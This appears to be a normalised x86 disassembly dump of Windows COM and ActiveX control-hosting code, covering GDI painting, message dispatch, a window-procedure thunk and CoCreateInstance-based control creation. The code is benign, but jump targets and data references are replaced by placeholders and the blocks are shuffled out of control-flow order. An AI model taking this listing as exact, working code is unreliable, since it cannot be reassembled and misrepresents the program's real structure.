retn 0x4
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x10 ]
push edx
push eax
call [ GetClientRect@IAT ]
mov ecx [ esi + 0xcc ]
push ecx
call [ CreateSolidBrush@IAT ]
mov edi eax
test edi edi
je r-xdata
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x1c ]
sub eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
sub ecx [ esp + 0x10 ]
push eax
push ecx
push ebp
call [ CreateCompatibleBitmap@IAT ]
mov ebx eax
mov [ esp + 0x20 ] ebx
test ebx ebx
je r-xdata
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0x28 ]
push eax
push ecx
call [ EndPaint@IAT ]
mov eax 0x1
pop edi
pop ebp
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_43f96b
add esp 0x64
retn 0x4
push edi
lea edx [ esp + 0x14 ]
push edx
push ebx
call [ FillRect@IAT ]
push edi
call [ DeleteObject@IAT ]
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x28 ]
push ecx
push edx
call [ EndPaint@IAT ]
mov eax 0x1
pop edi
pop ebp
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_43f96b
add esp 0x64
retn 0x4
push ebp
call [ CreateCompatibleDC@IAT ]
mov edi eax
test edi edi
je r-xdata
push ebx
call [ DeleteObject@IAT ]
push ebx
push edi
call [ SelectObject@IAT ]
mov [ esp + 0x24 ] eax
test eax eax
je r-xdata
push edi
call [ DeleteDC@IAT ]
mov edx [ esi + 0xcc ]
push edx
call [ CreateSolidBrush@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ esp + 0x24 ]
push eax
push edi
call [ SelectObject@IAT ]
mov ebx [ esp + 0x20 ]
push ebx
lea eax [ esp + 0x14 ]
push eax
push edi
call [ FillRect@IAT ]
push ebx
call [ DeleteObject@IAT ]
mov eax [ esi + 0x70 ]
mov edx [ eax ]
push 0x0
push 0x0
lea ecx [ esi + 0xb4 ]
push ecx
push ecx
push edi
push 0x0
push 0x0
push 0x0
push 0xffffffff
push 0x1
push eax
mov eax [ edx + 0xc ]
call eax
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push 0xcc0020
push 0x0
push 0x0
push edi
push ecx
push edx
push 0x0
push 0x0
push ebp
call [ BitBlt@IAT ]
sub_413e60
mov edx [ esi + 0xb4 ]
movsx eax cx
push ebx
shr ecx 0x10
push ebp
movsx ecx cx
push edi
mov edi [ esi + 0xb8 ]
lea ebp [ esi + 0xb4 ]
add ecx edi
add eax edx
mov [ esi + 0xbc ] eax
mov [ esi + 0xc0 ] ecx
sub ecx edi
lea ebx [ esi + 0xac ]
sub eax edx
lea edi [ esi + 0xa4 ]
mov [ ebx ] eax
mov [ esi + 0xb0 ] ecx
call sub_414f00
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax [ esi + 0x74 ]
test eax eax
je r-xdata
mov edx [ eax ]
push edi
push 0x1
push eax
mov eax [ edx + 0x44 ]
call eax
test [ esi + 0x98 ] 0x8
pop edi
pop ebp
pop ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x1c ]
push ebp
push ebp
push eax
call edx
mov ecx [ esp + 0x4 ]
mov [ ecx ] 0x0
xor eax eax
retn 0x4
mov ecx [ esi + 0x2c ]
mov edx [ ecx + 0x64 ]
lea eax [ esi + 0x2c ]
push 0x1
push 0x0
push eax
call edx
mov eax [ esp + 0x4 ]
mov [ eax ] 0x0
xor eax eax
retn 0x4
sub_413f10
push 0xffffffff
push sub_4590f8
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
test [ esi + 0xa0 ] 0x4000
mov eax [ esp + 0x1c ]
mov [ eax ] 0x0
je r-xdata
or [ esi + 0x98 ] 0x20
test [ esi + 0x98 ] 0x40
jne r-xdata
cmp [ esi + 0x64 ] 0x0
je r-xdata
xor eax eax
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0xc
retn 0x4
lea ebx [ esp + 0x1c ]
call sub_414000
test [ esi + 0x98 ] 0x1
jne r-xdata
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x14 ] 0x0
mov edx [ esi ]
mov eax [ edx + 0x10 ]
call eax
mov ecx [ eax ]
lea edx [ esp + 0x1c ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov ecx [ esp + 0x1c ]
test ecx ecx
je r-xdata
mov [ esp + 0x14 ] 0xffffffff
test ecx ecx
je r-xdata
mov eax [ esi + 0x64 ]
mov edx [ eax ]
lea ebx [ esi + 0xb4 ]
mov esi [ esi + 0x4 ]
push ebx
push esi
push 0x0
push ecx
push 0x0
push 0xfffffffb
push eax
mov eax [ edx + 0x2c ]
call eax
mov ecx [ esp + 0x1c ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push ecx
call eax
jmp r-xdata
sub_414000
push 0xffffffff
push sub_4593f8
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebp
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
test [ esi + 0x98 ] 0x8
je r-xdata
test [ esi + 0x98 ] 0x2
jne r-xdata
call [ GetFocus@IAT ]
mov edx [ esi + 0x4 ]
push eax
push edx
call [ IsChild@IAT ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
push ecx
jmp r-xdata
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x14 ] 0x0
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov ecx [ eax ]
lea edx [ esp + 0x8 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov ecx [ esp + 0x8 ]
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
xor eax eax
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebp
add esp 0x10
retn
mov eax [ esi + 0x4 ]
push 0x5
push eax
call [ GetWindow@IAT ]
push eax
call [ SetFocus@IAT ]
mov [ esp + 0x14 ] 0xffffffff
test ecx ecx
je r-xdata
mov eax [ esi + 0x64 ]
mov edx [ eax ]
lea ebp [ esi + 0xb4 ]
push ebp
mov ebp [ esi + 0x4 ]
push ebp
push 0x0
push ecx
push 0x0
push 0xfffffffc
push eax
mov eax [ edx + 0x2c ]
call eax
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push ecx
call eax
sub_4140f0
push ecx
mov ecx [ edx + 0x98 ]
xor eax eax
mov [ esp ] eax
test cl 0x1
je r-xdata
mov [ esi ] eax
pop ecx
retn 0xc
test cl 0x8
je r-xdata
mov ecx [ edx + 0x74 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov eax [ eax + 0x24 ]
lea edx [ esp ]
push edx
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push edx
push ecx
call eax
mov eax [ esp ]
mov [ esi ] 0x0
pop ecx
retn 0xc
sub_414140
push ecx
mov eax [ ecx + 0x98 ]
mov [ esp ] 0x0
test al 0x1
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ ecx ] 0x0
test al 0x8
je r-xdata
mov eax [ ecx + 0x74 ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ esp ]
push edx
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
cmp eax 0x1
jne r-xdata
mov eax [ esp ]
pop ecx
retn 0x10
sub_414190
push esi
mov esi eax
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push ecx
mov ecx [ esi + 0x20 ]
push edx
push eax
push ecx
call [ CallWindowProcW@IAT ]
call sub_419140
mov edx [ esp + 0x14 ]
mov [ edx ] 0x0
xor eax eax
pop esi
retn 0x10
sub_4141e0
push ebp
mov ebp [ esp + 0x8 ]
push edi
mov edi eax
cmp edi 0x39
ja r-xdata
cmp edi 0x115
ja r-xdata
je r-xdata
cmp edi 0x132
jb r-xdata
cmp edi 0x114
jae r-xdata
mov eax [ esi + 0x8 ]
jmp r-xdata
lea eax [ edi - 0x2b ]
cmp eax 0x4
ja r-xdata
mov ecx [ esp + 0x10 ]
pop edi
mov [ ecx ] 0x0
mov eax 0x1
pop ebp
retn 0x8
cmp edi 0x138
jbe r-xdata
mov eax esi
cmp edi 0x4e
je r-xdata
test eax eax
jne r-xdata
jmp [ eax * 4 + jump_table_41431c ]
cmp edi 0x210
jne r-xdata
mov ecx [ ebx + 0x98 ]
test cl 0x8
je r-xdata
mov eax [ esi ]
jmp r-xdata
cmp edi 0x111
jne r-xdata
cmp [ esi ] 0x1
mov eax [ esi + 0x14 ]
jne r-xdata
cmp [ esi ] 0x1
je r-xdata
mov eax [ esi + 0xc ]
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push esi
push ebp
add edi 0x2000
push edi
push eax
call [ SendMessageW@IAT ]
pop edi
pop ebp
retn 0x8
mov [ esp + 0xc ] 0x0
test cl 0x1
je r-xdata
test esi esi
je r-xdata
push eax
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebx + 0x4 ]
push eax
push ecx
call [ GetDlgItem@IAT ]
jmp r-xdata
movzx eax bp
dec eax
cmp eax 0x1
jbe r-xdata
mov edx [ eax + 0xc ]
mov ecx [ eax + 0x8 ]
push edx
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0x4 ]
push ecx
mov ecx [ ebx + 0x20 ]
push edx
push eax
push ecx
call [ CallWindowProcW@IAT ]
mov eax [ esp + 0xc ]
pop edi
pop ebp
retn 0x8
mov eax [ ebx + 0x74 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov edx ebp
shr edx 0x10
push edx
push eax
call [ GetDlgItem@IAT ]
jmp r-xdata
mov edx [ eax ]
mov edx [ edx + 0x24 ]
lea ecx [ esp + 0xc ]
push ecx
push esi
push ebp
add edi 0x2000
push edi
push eax
call edx
sub_414330
push 0xffffffff
push sub_4590c8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x60 ]
xor eax eax
mov [ esp + 0x14 ] eax
test ecx ecx
je r-xdata
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
mov edx [ ecx ]
lea eax [ esp + 0x14 ]
push eax
push r--data
push ecx
mov ecx [ edx ]
call ecx
mov eax [ esp + 0x14 ]
mov [ esp + 0xc ] 0xffffffff
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ eax ]
mov edx [ edx + 0x14 ]
push ecx
push eax
call edx
test eax eax
jne r-xdata
xor eax eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esp + 0x14 ]
mov [ esp + 0xc ] 0xffffffff
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov eax 0x1
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4143f0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
cmp [ ebp + 0x1c ] 0x0
push ebx
push esi
push edi
mov edi ecx
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
cmp eax 0x14
jne r-xdata
cmp eax 0xf
jne r-xdata
cmp [ edi + 0x70 ] 0x0
mov eax 0x1
jne r-xdata
cmp eax 0x5
jne r-xdata
lea eax [ esp + 0xc ]
push eax
mov esi edi
mov [ esp + 0x10 ] 0x1
call sub_413c80
mov [ ebx ] 0x1
test eax eax
je r-xdata
xor eax eax
cmp eax 0x21
jne r-xdata
lea ecx [ esp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
mov esi edi
mov [ esp + 0x10 ] 0x1
call sub_413e60
jmp r-xdata
mov esi [ ebp + 0x14 ]
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ edi + 0x98 ]
test al 0x8
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp eax 0x7
jne r-xdata
lea edx [ esp + 0xc ]
push edx
mov [ esp + 0x10 ] 0x1
call sub_413f10
cmp [ esp + 0xc ] 0x0
mov [ ebx ] eax
je r-xdata
cmp [ esp + 0xc ] 0x0
mov [ ebx ] eax
je r-xdata
mov eax [ edi + 0x98 ]
mov edx eax
shr edx 0x2
and edx eax
test dl 0x8
je r-xdata
mov ecx [ ebp + 0xc ]
add ecx 0xfffffe00
cmp ecx 0xd
ja r-xdata
cmp eax 0x8
jne r-xdata
or [ edi + 0x98 ] 0x20
test [ edi + 0x98 ] 0x40
mov [ esp + 0xc ] 0x1
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
cmp eax 0x100
jne r-xdata
and al 0x10
movzx eax al
neg eax
sbb eax eax
and eax 0x3
mov [ esp + 0x14 ] eax
jne r-xdata
and [ edi + 0x98 ] 0xffffffdf
mov [ ebx ] 0x0
jmp r-xdata
xor ecx ecx
xor eax eax
lea ebx [ esp + 0xc ]
mov esi edi
call sub_414000
mov ecx [ esp + 0xc ]
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
jmp r-xdata
test [ edi + 0xc8 ] 0x8
je r-xdata
mov edx [ ebp + 0x10 ]
lea ecx [ esp + 0xc ]
push ecx
push esi
push edx
push eax
mov eax edi
mov [ esp + 0x1c ] 0x1
call sub_414190
cmp [ esp + 0xc ] 0x0
mov [ ebx ] eax
jne r-xdata
cmp eax 0x101
jne r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ esp + 0xc ]
push eax
push esi
push ecx
push 0x100
cmp eax 0x3
jne r-xdata
mov eax [ edi + 0x70 ]
test eax eax
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov [ ebx ] eax
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ rw-data ]
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
lea eax [ esp + 0xc ]
push eax
mov eax [ ebp + 0xc ]
push ecx
mov ebx edi
mov [ esp + 0x14 ] 0x1
call sub_4141e0
cmp [ esp + 0xc ] 0x0
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
jne r-xdata
cmp eax 0x102
jne r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ esp + 0xc ]
push edx
push esi
push eax
push 0x101
jmp r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0xc ]
cmp eax 0x200
jne r-xdata
mov edx esi
shr edx 0x10
movsx ecx dx
mov edx [ eax ]
mov edx [ edx + 0x30 ]
mov [ esp + 0x10 ] ecx
lea ecx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
push 0x0
push ecx
movsx ecx si
push ecx
lea ecx [ edi + 0xb4 ]
push ecx
push 0x1
push eax
call edx
mov eax [ esp + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x10 ]
mov ecx edi
call edx
mov esi eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push esi
call ecx
mov [ ebx ] esi
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ebx edx
cmp eax 0x103
jne r-xdata
mov edx [ ebp + 0x10 ]
lea ecx [ esp + 0xc ]
push ecx
push esi
push edx
push eax
jmp r-xdata
mov ecx edi
mov [ esp + 0x1c ] 0x1
call sub_414140
cmp [ esp + 0xc ] 0x0
mov [ ebx ] eax
je r-xdata
cmp eax 0x202
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push eax
push ecx
push 0x200
cmp eax 0x37f
jne r-xdata
mov edi [ edi + 0x60 ]
test edi edi
je r-xdata
cmp eax 0x104
jne r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ esp + 0xc ]
push eax
push esi
push ecx
push 0x103
jmp r-xdata
cmp eax 0x205
jne r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
push edx
push eax
push 0x202
jmp r-xdata
mov esi [ ebp + 0x14 ]
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebp + 0x14 ]
push ecx
push edi
call sub_414330
mov [ ebx ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov [ ebx ] edi
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov edx [ edi ]
mov eax [ edx + 0x4 ]
push edi
call eax
cmp eax 0x105
jne r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ esp + 0xc ]
push edx
push esi
push eax
push 0x104
jmp r-xdata
cmp eax 0x208
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push ecx
push edx
push eax
jmp r-xdata
lea esi [ esp + 0x18 ]
mov edx edi
mov [ esp + 0x18 ] 0x1
call sub_4140f0
cmp [ esp + 0xc ] 0x0
mov [ ebx ] eax
je r-xdata
cmp eax 0x107
jne r-xdata
mov edx [ ebp + 0x10 ]
lea ecx [ esp + 0xc ]
push ecx
push esi
push edx
push eax
jmp r-xdata
cmp eax 0x201
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push eax
push ecx
push 0x208
jmp r-xdata
cmp eax 0x53
jne r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ esp + 0xc ]
push eax
push esi
push ecx
push 0x107
jmp r-xdata
cmp eax 0x204
jne r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
push edx
push eax
push 0x201
jmp r-xdata
cmp eax 0x1f
jne r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ esp + 0xc ]
push edx
push esi
push eax
push 0x53
jmp r-xdata
cmp eax 0x207
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push ecx
push edx
push eax
jmp r-xdata
cmp eax 0x286
jne r-xdata
mov edx [ ebp + 0x10 ]
lea ecx [ esp + 0xc ]
push ecx
push esi
push edx
push eax
jmp r-xdata
cmp eax 0x203
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push eax
push ecx
push 0x207
jmp r-xdata
cmp eax 0x209
jne r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ esp + 0xc ]
push eax
push esi
push ecx
push 0x286
mov ecx edi
mov [ esp + 0x1c ] 0x1
call sub_414140
cmp [ esp + 0xc ] 0x0
mov [ ebx ] eax
je r-xdata
cmp eax 0x206
jne r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
push edx
push eax
push 0x203
jmp r-xdata
cmp eax 0x281
jb r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ esp + 0xc ]
push edx
push esi
push eax
push 0x209
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
lea ecx [ esp + 0xc ]
push ecx
push esi
push edx
push eax
mov ecx edi
mov [ esp + 0x1c ] 0x1
call sub_414140
cmp [ esp + 0xc ] 0x0
mov [ ebx ] eax
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp eax 0x209
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push ecx
push edx
push eax
jmp r-xdata
cmp eax 0x2
jne r-xdata
cmp eax 0x291
ja r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push eax
push ecx
push 0x209
lea esi [ esp + 0x18 ]
mov edx edi
mov [ esp + 0x18 ] 0x1
call sub_4140f0
cmp [ esp + 0xc ] 0x0
mov [ ebx ] eax
jne r-xdata
sub_414990
push ecx
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
push esi
push 0x0
push 0x0
push r--data
lea edx [ esp + 0x10 ]
push edx
mov edx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x28 ]
push edx
push eax
mov eax [ ecx + 0x28 ]
mov [ esp + 0x24 ] 0x0
call eax
mov esi eax
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov eax esi
pop esi
pop ecx
retn 0x10
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4149e0
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
push 0x0
push edx
mov edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
retn 0x1c
sub_414a10
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
lea esi [ edi - 0x24 ]
call sub_419140
mov eax [ edi - 0x20 ]
mov ebp [ esp + 0x1c ]
xor bl bl
test eax eax
je r-xdata
push ebp
call [ IsWindow@IAT ]
test eax eax
je r-xdata
cmp eax ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0xc
cmp [ edi - 0x20 ] ebp
je r-xdata
push 0x507
push 0x0
push 0x0
push eax
call [ RedrawWindow@IAT ]
call sub_415600
mov eax [ esp + 0x18 ]
push 0x0
push 0x1
push eax
call sub_415000
mov ebp eax
test ebp ebp
jge r-xdata
mov ebx ebp
call sub_414bd0
shl eax 0x4
xor eax [ esi + 0xc8 ]
mov bl 0x1
and eax 0x10
xor [ esi + 0xc8 ] eax
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn 0xc
call sub_419140
mov edi [ edi - 0x20 ]
test edi edi
je r-xdata
push 0x507
push 0x0
push 0x0
push edi
call [ RedrawWindow@IAT ]
test bl bl
je r-xdata
call sub_415600
sub_414ac0
mov ecx [ esp + 0xc ]
mov eax 0x80004003
test ecx ecx
je r-xdata
retn 0xc
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x3c ]
test eax eax
je r-xdata
mov [ ecx ] 0x0
mov eax 0x80040004
mov edx [ eax ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x4 ] eax
mov edx [ edx ]
jmp edx
sub_414b00
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
cmp [ edi + 0x54 ] esi
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x8
test esi esi
je r-xdata
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push esi
call ecx
mov [ edi + 0x54 ] esi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_414b40
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
cmp [ edi + 0x58 ] esi
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x8
test esi esi
je r-xdata
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push esi
call ecx
mov [ edi + 0x58 ] esi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_414b80
push ecx
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
push esi
push edx
push 0x0
push r--data
lea edx [ esp + 0x10 ]
push edx
mov edx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x28 ]
push edx
push eax
mov eax [ ecx + 0x28 ]
mov [ esp + 0x24 ] 0x0
call eax
mov esi eax
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov eax esi
pop esi
pop ecx
retn 0x14
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_414bd0
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push edi
mov ecx esi
call edx
cmp [ esi + 0x14 ] 0x0
mov edi eax
jne r-xdata
mov eax [ esi + 0x14 ]
sub edi eax
push 0xd
sub edi 0xd
push eax
mov [ eax ] 0x42444c7
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] 0xe9
mov [ eax + 0x9 ] edi
call [ GetCurrentProcess@IAT ]
push eax
call [ FlushInstructionCache@IAT ]
mov eax [ esi + 0x14 ]
push eax
push 0xfffffffc
push ebx
call [ SetWindowLongW@IAT ]
test eax eax
je r-xdata
call j_sub_43f543
mov [ esi + 0x14 ] eax
test eax eax
je r-xdata
xor eax eax
pop edi
retn
mov [ esi + 0x20 ] eax
mov [ esi + 0x4 ] ebx
mov eax 0x1
pop edi
retn
sub_414c40
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x18 ]
mov eax [ eax ]
push eax
call [ GetParent@IAT ]
push 0x8
lea ecx [ esp + 0x4 ]
push ecx
push eax
call [ GetClassNameW@IAT ]
test eax eax
jne r-xdata
push r--data
lea edx [ esp + 0x4 ]
push edx
call [ lstrcmpW@IAT ]
mov ecx [ esp + 0x10 ]
neg eax
sbb eax eax
xor ecx esp
inc eax
call sub_43f96b
add esp 0x14
retn 0x4
mov ecx [ esp + 0x10 ]
xor ecx esp
call sub_43f96b
add esp 0x14
retn 0x4
sub_414cb0
push esi
mov esi eax
push edi
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov edi [ CharNextW@IAT ]
mov edi edi
mov eax r--data
jmp r-xdata
movzx ecx [ eax ]
test cx cx
je r-xdata
push esi
call edi
mov esi eax
test esi esi
jne r-xdata
cmp [ esi ] cx
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push esi
call edi
pop edi
pop esi
retn
push eax
call edi
test eax eax
jne r-xdata
sub_414d00
push 0xffffffff
push sub_459098
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x14 ] eax
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2c ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x3c ]
mov esi ecx
mov ebx edx
mov [ esp + 0x10 ] eax
test edi edi
jne r-xdata
mov [ edi ] 0x0
mov ebp 0x80004005
mov [ ebx ] 0x0
test esi esi
je r-xdata
mov eax 0x80004003
jmp r-xdata
xor eax eax
movzx eax [ esi ]
test ax ax
je r-xdata
mov ecx [ esp + 0x2c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x14 ]
xor ecx esp
call sub_43f96b
add esp 0x28
retn
cmp ax 0x4d
je r-xdata
movzx eax [ esi + 0x2 ]
cmp ax 0x53
je r-xdata
cmp ax 0x6d
jne r-xdata
movzx eax [ esi + 0x4 ]
cmp ax 0x48
je r-xdata
cmp ax 0x73
jne r-xdata
mov eax esi
call sub_414cb0
test eax eax
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax 0x54
je r-xdata
cmp ax 0x68
jne r-xdata
push esi
call [ lstrlenW@IAT ]
cmp eax 0xff
jge r-xdata
push edi
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
mov [ ebx ] 0x1
mov ebp eax
jmp r-xdata
movzx eax [ esi + 0x8 ]
cmp ax 0x4d
je r-xdata
cmp ax 0x74
jne r-xdata
mov eax ebp
jmp r-xdata
cmp [ esi ] 0x7b
jne r-xdata
movzx eax [ esi + 0xa ]
cmp ax 0x4c
je r-xdata
cmp ax 0x6d
jne r-xdata
lea edx [ esp + 0x14 ]
push edx
push esi
call [ CLSIDFromProgID@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push esi
call [ CLSIDFromString@IAT ]
jmp r-xdata
cmp [ esi + 0xc ] 0x3a
jne r-xdata
cmp ax 0x6c
jne r-xdata
mov esi [ esp + 0x10 ]
push esi
call [ SysStringLen@IAT ]
test eax eax
je r-xdata
mov ebp eax
xor ebx ebx
cmp ebp ebx
jl r-xdata
push edi
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
mov [ ebx ] 0x1
mov ebp eax
jmp r-xdata
push edi
push r--data
push 0x1
push ebx
lea eax [ esp + 0x24 ]
push eax
call [ CoCreateInstance@IAT ]
mov ebp eax
mov [ esp + 0x10 ] ebx
lea eax [ esp + 0x10 ]
push eax
push r--data
